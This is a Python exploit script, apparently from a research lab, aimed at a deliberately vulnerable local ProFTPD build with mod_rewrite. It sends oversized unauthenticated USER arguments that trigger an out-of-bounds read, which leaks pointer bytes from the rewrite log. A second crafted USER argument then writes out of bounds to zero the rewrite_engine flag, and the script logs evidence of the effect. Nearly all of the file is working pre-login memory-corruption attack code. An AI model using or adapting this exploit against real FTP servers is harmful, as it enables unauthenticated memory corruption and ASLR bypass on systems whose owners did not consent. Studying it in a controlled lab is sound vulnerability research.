#!/usr/bin/env python3
"""Pre-login ASLR-on rung-4 limb: leak substr from USER, zero rewrite_engine.

Phase 1: 1025-code-point unauthenticated USER argument logs eight substr bytes
inside the map-result string (pstrdup over-read at mod_rewrite.c:2072).
Phase 2: 1281-code-point USER writes those bytes back and sets code point
1280 to U+0100, zeroing the rewrite_engine flag via the second OOB loop.
Phase 3: a short USER shows whether rewriting is still active. ENGINE_ZERO=0
is the control. No addresses are computed; no login, no PASS, no setarch.
"""
import io
import os
import re
import socket
import subprocess
import time

W = os.path.dirname(os.path.abspath(__file__))
CFG = W + "/etc/proftpd-prelogin-leak.conf"
BIN = W + "/../proftpd-vuln-plain"
LOG = W + "/log/rewrite-prelogin-leak.log"
PORT = 21914
TAG = os.environ.get("TAG", "prelogin-aslron")


def leak():
    for _ in range(20):
        time.sleep(0.1)
        try:
            data = open(LOG, "rb").read()
        except OSError:
            continue
        cands = []
        for ln in data.split(b"\n"):
            m = re.search(rb"maps subst'd pattern: '([^']*)'", ln)
            if m and len(m.group(1)) >= 1025:
                v = m.group(1)[-6:]
                if len(v) == 6 and 0x40 <= v[-1] <= 0x7F:
                    cands.append(v)
        if cands:
            return cands[-1]
    return None
def cmd(s, name, arg=b""):
    s.sendall(name + (b" " + arg if arg else b"") + b"\r\n")
    try:
        return s.recv(4096)[:200]
    except OSError as exc:
        return ("RECV_FAIL " + type(exc).__name__).encode()


def main():
    zero = os.environ.get("ENGINE_ZERO", "1") == "1"
    out = W + "/evidence/" + TAG + ".txt"
    open(LOG, "wb").close()
    srv = subprocess.Popen([BIN, "-n", "-c", CFG], cwd=W,
                           stdout=open(W + "/log/" + TAG + "-server.out", "wb"),
                           stderr=subprocess.STDOUT)
    lines = []
    data = b""
    try:
        for _ in range(80):
            try:
                s = socket.create_connection(("127.0.0.1", PORT), 0.3)
                s.close()
                break
            except OSError:
                time.sleep(0.05)
        s = socket.create_connection(("127.0.0.1", PORT), 8)
        s.settimeout(8)
        lines.append("BANNER " + repr(s.recv(4096)[:120]))
        k1 = (chr(0xE8) + "A" * 1024).encode("utf-8")
        ptr = None
        for length in (1025, 1026, 1027, 1028, 1029, 1030, 1031, 1032):
            k1 = (chr(0xE8) + "A" * (length - 1)).encode("utf-8")
            lines.append("LEAK_USER_REPLY_%d %s" % (length, repr(cmd(s, b"USER", k1))))
            ptr = leak()
            if ptr is not None:
                lines.append("LEAK_LENGTH %d" % length)
                break
        lines.append("LEAKED_PTR %s" % (ptr.hex() if ptr else "NONE"))
        pre = open(LOG, "rb").read()
        lines.append("EXECUTING_PRE %d" % pre.count(b"executing RewriteRule"))
        lines.append("MAP_SUBST_PRE %d" % pre.count(b"maps subst'd pattern:"))
        if ptr is None:
            lines.append("LEAK_FAILED")
            return
        ptr8 = ptr + b"\x00\x00"
        n = 1281
        cps = ["A"] * n
        for k in range(8):
            cps[8 * k] = chr(ptr8[k]) if ptr8[k] else "\u0100"
        cps[1280] = "\u0100" if zero else "A"
        k2 = "".join(cps).encode("utf-8")
        lines.append("LONG_USER_REPLY " + repr(cmd(s, b"USER", k2)))
        lines.append("SHORT_USER_REPLY " + repr(cmd(s, b"USER", b"labuser")))
        lines.append("NOOP_REPLY " + repr(cmd(s, b"NOOP")))
        lines.append("PWD_REPLY " + repr(cmd(s, b"PWD")))
        s.close()
        time.sleep(0.2)
        data = open(LOG, "rb").read()
        lines.append("EXECUTING_COUNT %d" % data.count(b"executing RewriteRule"))
        lines.append("MAP_SUBST_COUNT %d" % data.count(b"maps subst'd pattern:"))
        lines.append("EXECUTING_POST %d" % (data.count(b"executing RewriteRule") - pre.count(b"executing RewriteRule")))
        lines.append("MAP_SUBST_POST %d" % (data.count(b"maps subst'd pattern:") - pre.count(b"maps subst'd pattern:")))
        lines.append("SIGNALS %d" % open(W + "/log/" + TAG + "-server.out", "rb").read().count(b"signal 11"))
    finally:
        srv.terminate()
        try:
            srv.wait(timeout=3)
        except subprocess.TimeoutExpired:
            srv.kill()
        subprocess.run(["fuser", "-k", "-n", "tcp", str(PORT)], capture_output=True)
        with open(W + "/evidence/rewrite-" + TAG + ".log", "wb") as f:
            f.write(data)
        with open(out, "w") as f:
            f.write("\n".join(lines) + "\n")
        print("\n".join(lines))


if __name__ == "__main__":
    main()
